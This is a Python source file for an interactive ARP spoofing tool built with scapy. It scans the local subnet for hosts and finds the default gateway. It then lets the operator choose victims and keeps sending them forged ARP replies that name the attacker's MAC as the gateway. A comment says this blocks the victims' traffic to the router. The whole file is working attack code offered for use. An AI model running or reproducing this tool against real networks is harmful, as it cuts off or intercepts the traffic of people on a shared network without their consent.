#scan select spoof restore




import scapy.all as scapy

import os
# import asyncio # will not work because it doesnt use threads which is needed in this script
import threading
import subprocess
import uuid
import socket
import ifcfg
from textual.app import App,ComposeResult
from textual.widgets import Label,Button,Welcome
import time
import queue
import logging

# logging.getLogger("scapy").setLevel(logging.CRITICAL)

def mainer(f):
    def wrap():
        # print(f"got function {f.__name__}")
        try:
            f()
        except Exception as e:
            if(str(e) == "[Errno 1] Operation not permitted"):
                print("must run as root")
                return
            raise e
    return wrap
class arptypes():
    isat = "is-at"
    whohas = "who-has"
    ping = "ping"
    
class qmanager:
    #there is a problem here that its always running
    running = False
    waiting = False
    packets:queue.Queue = queue.Queue()
    def addpacket(packet)->None:
        """gets packets like (state-int,packet type)
        0 - normal packets
        1 - normal packets with listenning require stream(data)
        2 - low level packets with listenning require stream(data)"""
        qmanager.packets.put(packet)
        #(state,(packet,timeout))
        # print(f"adding packet to queue({qmanager.packets.qsize()})")
        qmanager.stream()
    def stream(data=None):
        if (data ==None):
            qmanager.running = True
            while qmanager.packets.qsize() >0:
                item = qmanager.packets.get()
                try:
                    state,packet = item
                except:
                    print(item)
                    continue
            
                if state == 0:#normal
                    scapy.sendp(packet,loop=False,verbose=False)
                if qmanager.waiting:
                    while (qmanager.waiting):#waiting for urgent task to complete
                        time.sleep(0.001)#waiting
            qmanager.running = False
        else:
            state,packet = data
            output = None
            while (qmanager.running):
                qmanager.waiting = True
                time.sleep(0.001)#waiting
            if state == 1:#srp - recored and return
                output = scapy.srp(packet[0],timeout=packet[1],verbose=False)
            elif state == 2:#sr -same as before for lower level packets
                output = scapy.sr(packet[0],timeout=packet[1],verbose=False)
            qmanager.waiting = False
            return output
    def clearQueue():
        while qmanager.packets.qsize()>0:
            qmanager.packets.get_nowait()

def builtarppacket(dst:tuple,srcIsAt:tuple,arptype:str) -> bytes:
    

    # if len(dst)==0:
    #     raise Exception(f"dst tuple doesn't have enough items expected:2 got:{len(dst)}")
    # just send to braodcast
    if len(srcIsAt)<2:
        raise Exception(f"srcIsAt tuple doesn't have enough items expected:2 got:{len(srcIsAt)}")
    set_ip,set_mac = srcIsAt
    dst_ip,dst_mac= dst
    
    
    if "/" not in dst_ip and (None in (dst_ip,dst_mac) or "" in (dst_mac.strip(),dst_ip.strip()) or dst_mac.count(":") !=5 or dst_ip.count(".") !=3):
        #sending braodcast if the target addr is bad

        dst_ip,dst_mac = None,None
    #the / is used to decler the netwrok leyers
    #5 application
    #4 transport(protocol)
    #4 network(ip)
    #2 data link(ethernet/wifi)
    #1 physical
    match arptype:
        case arptypes.isat:
            l2 = scapy.Ether(dst=dst_mac)
            l3 = scapy.ARP(op=arptype,pdst=dst_ip,psrc=set_ip,hwsrc=set_mac,hwdst=set_mac)
            packet = l2/l3
        case arptypes.whohas:
            l2 = scapy.Ether(dst=dst_mac)
            l3 = scapy.ARP(op=arptype,pdst=dst_ip,psrc=set_ip,hwsrc=set_mac,hwdst=set_mac)
            packet = l2/l3
        case arptypes.ping:
            packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=dst_ip)
    #ahh send is for layer 2 and lower(simpler packets) and sendp is for the other layers
    return packet
    # scapy.sendp(packet,loop=1,verbose=False)#sendp is for packet object and send is raw bytes 
def getmymac()->str:
    mymac = uuid.getnode()
    mymac = uuid.UUID(int=mymac).hex[-12:]
    mymac = ":".join([mymac[x]+mymac[x+1] for x in range(0,11,2)])
    return mymac

def getsubnet()->int:
    output = 0
    # for x in ifcfg.interfaces().items():
    #     print(scapy.conf.iface)
    #     output.append((x[0],x[1]['netmask']))
    mask = ifcfg.interfaces()[scapy.conf.iface]['netmask']
    mask = mask.split('.')
    for x in mask:
        output += str(bin(int(x))).count('1')
    return output

def selectinterface(iface:str)->bool:
    if iface not in scapy.conf.ifaces:
        return 0
    scapy.InterfaceProvider.load(iface)
    return 1
def thispcay()->tuple:
    mymac = getmymac()
    myip = socket.gethostbyname(socket.gethostname())
    return (myip,mymac)
def Scanenetwork(timeout:int =2,subnet:str=None) -> dict:
    #fix this
    #ip -> mac
    #use the arp command announcement
    # print(subprocess.run("arp".split(" "),capture_output=True).stdout.decode())
    src = thispcay()
    if (subnet == None):
        subnet = f"{src[0]}/{getsubnet()}"

    
    #arp ping Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24")
    packet = (1,(builtarppacket((subnet,""),src,arptypes.ping),timeout))
    res, _ = qmanager.stream(packet) # listen for packets
    # res = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst="192.168.1.0/24"),timeout=timeout)
    output = {}
    for x in res:
        mac = x.answer.src
        ip = x.answer.psrc
        output[ip] = mac
    return output
    
def getDefaultGateway():
    #take the local ip and get an ip that outside of the subnet which forces the os to send it outside the network using trace route with ttl of 2
    targetip = thispcay()[0]
    targetip = [str(128 ^ int(targetip.split(".")[0]))] + targetip.split(".")[1:] # xor operation on the first byte of the ip with 128(1000 0000)cause a not operation on the first bit
    targetip= ".".join(targetip)
    result, unans = qmanager.stream((2,(scapy.IP(dst=targetip,ttl=(1,1))/scapy.ICMP(),5))) #ttl of 1 to find only the first hop
    return result[0].answer.src
    

class Data:
    clientsFound:dict={} # {ip:mac,...}
    Scan = True
    TargetedClients = []
    attack = False
    threads = []
    stopthreads = False
    
def ScanForever()->None:
    print("starting to scan")
    Data.clientsFound = Scanenetwork(0.5)
    while Data.Scan and not Data.stopthreads:
        items = Scanenetwork(5*2**(24-getsubnet() if getsubnet()<24 else 0))
        for ip,mac in items.items():
            Data.clientsFound[ip] = mac

def ask(q:str,possibleanswers:list) -> str:
    output = input(q)
    if "*" in possibleanswers:
        return output
    else:
        if output in possibleanswers:
            return output
        else:
            return ask(q,possibleanswers)
def Spoof(Targets:list=Data.TargetedClients)->None:
    #currently just blocking the communication with the router
    print("starts attacking\n")
    Data.attack = True
    
    gateway = getDefaultGateway()
    mymac = getmymac()
    
    while Data.attack and not Data.stopthreads:
        for ip,mac in Targets:
            # task = threading.Thread(target=sendspoofedpacket,args=(builtarppacket((ip,mac),(gateway,mymac),arptypes.isat)))
            # Data.threads.append(task)
            # task.start()
            # print((ip,mac),(gateway,mymac))
            packet = builtarppacket((ip,mac),(gateway,mymac),arptypes.isat)
            for _ in range(5):
                qmanager.addpacket((0,packet))
        time.sleep(5)
    
    
    
def StopAll()->None:
    Data.attack=False
    Data.Scan=False
    Data.stopthreads=True
    for task in Data.threads:
        task.join()
        
def menus(number:int|str=0)->None:
    #o display menus
    #1 display and pick clients to target
    
        
    menusdict = {
        "0":"menus",
        "1": "pick clients"
    }
    pickedmenu = 0
    
    match int(number):
        case 0:
            print("\n".join([f"{x[0]}: {x[1]}" for x in menusdict.items()]))
            pickedmenu = ask("pick a menu by its number:",["*"])
        case 1:
            qmanager.clearQueue()
            Data.attack = False #stoppping all current attacks
            clients = list(Data.clientsFound.items())
            print(f"currently targets:{Data.TargetedClients}")
            print("\n".join([ f"{x+1}:{clients[x][0]} -> {clients[x][1]}" for x in range(len(clients))]))
            newtargetsidx = ask("type clients you want to target by their number with comma(,) between numbers, enter 0 to keep the current ones:",["*"])
            newtargets = []
            if newtargetsidx != "0":
                newtargetsidx = newtargetsidx.split(",")
                for idx in newtargetsidx:
                    try:
                        idx = int(idx)-1
                        newtargets.append(clients[idx])
                    except:
                        print(f"index {idx} does not exist in the list")
            else:
                newtargets=Data.TargetedClients
            Data.TargetedClients = newtargets
            print(f"updated targets:{[x[0] for x in Data.TargetedClients]}")
            task = threading.Thread(target=Spoof,args=([Data.TargetedClients]))
            Data.threads.append(task)
            task.start()
    if str(pickedmenu) in menusdict.keys():
        menus(pickedmenu)
    else:
        if not str(pickedmenu).isnumeric():
            if str(pickedmenu).lower() in ["q","exit","quit"]:
                print("goodbye")
                StopAll()
                return
        print(f"menu:{pickedmenu} is unavailable")
        menus(0)
    
    
@mainer
def main()->None:
    # scapy.sendp(builtarppacket((None,None),("192.168.16.20","aa:aa:aa:aa:aa:aa")))
        # print(Scanenetwork(2))
        task = threading.Thread(target=ScanForever)
        Data.threads.append(task)
        task.start()
        menus()
        
        
        
        
main()
# print(getDefaultGateway())